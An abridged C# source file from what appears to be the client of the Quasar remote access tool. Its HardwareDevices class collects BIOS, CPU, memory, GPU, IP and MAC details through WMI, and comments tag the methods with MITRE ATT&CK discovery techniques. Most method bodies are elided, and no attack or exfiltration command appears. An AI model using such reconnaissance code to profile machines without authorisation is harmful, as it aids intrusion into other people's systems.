...
namespace Quasar.Client.IO
{
    ...
    public static class HardwareDevices
    {
        ...
        /// <summary>
        /// Gets BIOS manufacturer via WMI query.
        /// </summary>
        /// <remarks>
        ...
        private static string GetBiosManufacturer()
        {
            ...
            {
                Logger.Error("GetBiosManufacturer exception: " + ex.ToString());
            }
        ...
        /// <summary>
        /// Gets BIOS mainboard name via WMI query.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1082: System Information Discovery
        ...
        private static string GetMainboardName()
        {
            ...
            {
                Logger.Error("GetMainboardName exception: " + ex.ToString());
            }
        ...
        private static string GetCpuName()
        {
            ...
            {
                Logger.Error("GetCpuName exception: " + ex.ToString());
            }
        ...
        /// <summary>
        /// Gets total physical memory via WMI query.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1082: System Information Discovery
        ...
        private static int GetTotalPhysicalMemoryInMb()
        {
            ...
            {
                Logger.Error("GetTotalPhysicalMemoryInMb exception: " + ex.ToString());
                return -1;
            }
        }

        /// <summary>
        /// Gets GPU name via WMI query.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1082: System Information Discovery
        ...
        private static string GetGpuName()
        {
            ...
            {
                Logger.Error("GetGpuName exception: " + ex.ToString());
                return "Unknown";
            }
        }
        ...
        private static string GetLanIpAddress()
        {
            ...
            Logger.Error("Failed to obtain local IP address.");
            return "-";
        }

        /// <summary>
        /// Gets local MAD address.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1016: System Network Configuration Discovery
        ...
        private static string GetMacAddress()
        {
            ...
            Logger.Error("Failed to obtain local MAC address.");
            return "-";
        }
    }
}
